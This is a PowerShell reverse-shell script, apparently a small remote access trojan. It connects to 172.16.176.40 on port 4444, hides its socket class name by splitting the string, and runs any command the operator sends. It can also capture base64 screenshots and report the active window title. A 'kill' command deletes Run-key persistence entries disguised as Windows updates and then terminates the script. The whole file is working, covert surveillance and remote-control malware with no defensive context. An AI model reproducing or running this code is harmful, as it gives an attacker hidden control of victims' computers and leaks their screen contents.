$a = "System.Net.Sockets."
$b = "TCPClient"
$c = New-Object ($a + $b)("172.16.176.40", 4444)
$s = $c.GetStream()

[byte[]]$b_arr = 0..65535|%{0}
$m = ([text.encoding]::ASCII).GetBytes("CONNECTED`n$ ")
$s.Write($m,0,$m.Length)

# Screenshot function
function Get-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
    $mem = New-Object System.IO.MemoryStream
    $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $base64 = [Convert]::ToBase64String($mem.ToArray())
    $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
    return $base64
}

# Window title
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
}
"@

function Get-ActiveWin {
    $handle = [Win32]::GetForegroundWindow()
    $builder = New-Object System.Text.StringBuilder 256
    [Win32]::GetWindowText($handle, $builder, 256) | Out-Null
    return $builder.ToString()
}

while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i)
    
    if ($d.Trim() -eq "screenshot") {
        $sb = Get-Screenshot
    }
    elseif ($d.Trim() -eq "window") {
        $sb = "[ACTIVE]: " + (Get-ActiveWin)
    }
    elseif ($d.Trim() -eq "kill") {
        # Cleanup registry
        $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        "SysUpdate","WinDiag","WinUpdate" | % { 
            Remove-ItemProperty $reg -Name $_ -ErrorAction SilentlyContinue 
        }
        $sb = "[!] Cleanup complete. Self-terminating."
        Start-Sleep 1; Stop-Process -Id $PID -Force
    }
    else {
        try { 
            $sb = (Invoke-Expression $d 2>&1 | Out-String) 
        } catch { 
            $sb = $_.Exception.Message 
        }
    }
    
    $out = $sb + "$ " + (pwd).Path + "> "
    $m = ([text.encoding]::ASCII).GetBytes($out)
    $s.Write($m,0,$m.Length)
    $s.Flush()
}
$c.Close()
